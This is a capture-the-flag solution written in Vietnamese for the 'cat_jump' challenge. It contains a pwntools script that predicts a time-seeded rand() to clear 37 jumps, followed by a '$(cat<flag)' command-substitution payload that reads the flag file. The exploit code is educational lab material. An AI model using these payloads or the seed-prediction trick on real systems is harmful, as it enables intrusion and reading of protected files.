#
```python
#!/usr/bin/env python3

from pwn import *
import ctypes
import time

context.binary = elf = ELF('./cat_jump')
context.log_level = 'info'

libc = ctypes.CDLL('libc.so.6') 
# CDLL() tải một thư viện liên kết động để Python có thể gọi các hàm được thư viện đó cung cấp.


libc.srand.argtypes = [ctypes.c_uint]
# void srand(unsigned int seed);
# khai báo rằng srand() nhận một đối số kiểu unsigned int.
# argtypes: mô tả kiểu dữ liệu của các tham số.
# ctypes.c_uint: kiểu số nguyên không dấu của C.
# [ctypes.c_uint]: danh sách gồm một tham số.


libc.rand.restype = ctypes.c_int
# int rand(void);
# rand() trả về một số nguyên kiểu int.
# libc.rand.restype = ctypes.c_int chỉ định kiểu trả về của hàm. (restype là viết tắt của return type.)
#


while True:
    before = int(time.time()) #Hàm time.time() trả về thời gian hiện tại tính bằng giây kể từ Unix Epoch.
    
    p = process(elf.path)
    p.recvuntil(b'let the cat reach the roof!')

    after = int(time.time())

    if before == after:
        seed = before
        break

    p.close()

libc.srand(seed)

log.info(f'Seed = {seed}')

for i in range(37):
    p.recvuntil(b"right jump='j': ")

    obstacle = libc.rand() % 2

    if obstacle == 0:
        direction = b'l'
    else:
        direction = b'h'

    libc.rand()

    log.info(f'Jump {i+1}: {direction.decode()}')
    p.sendline(direction)

p.recvuntil(b"let people know your cat's name")

log.success('Bypassed all 37 jumps!')
p.interactive()
```

```sh
echo "$(cat<flag)" > /tmp/cat_db
```


| Thành phần | Ý nghĩa |
|---|---|
| `$(...)` | Thực thi lệnh bên trong và lấy output |
| `cat` | In nội dung file |
| `<flag` | Chuyển file `flag` thành standard input |
| `"$(cat<flag)"` | Thay thế bằng nội dung file `flag` trong dấu nháy kép |
| `> /tmp/cat_db` | Ghi kết quả vào file `/tmp/cat_db` |


```python
p.recvuntil(b"let people know your cat's name")

payload = b'$(cat<flag)'
p.sendline(payload)

log.success("Command Injection payload sent!")

print(p.recvall(timeout=2).decode(errors="replace"))
```

| Thành phần | Ý nghĩa |
|---|---|
| `recvuntil()` | Đợi chương trình hỏi tên mèo |
| `payload` | Chứa cú pháp command substitution |
| `sendline()` | Gửi payload kèm byte `\n` |
| `recvall()` | Nhận output còn lại cho đến khi chương trình kết thúc hoặc hết thời gian chờ |
| `decode(errors="replace")` | Chuyển dữ liệu nhận được thành văn bản để hiển thị |


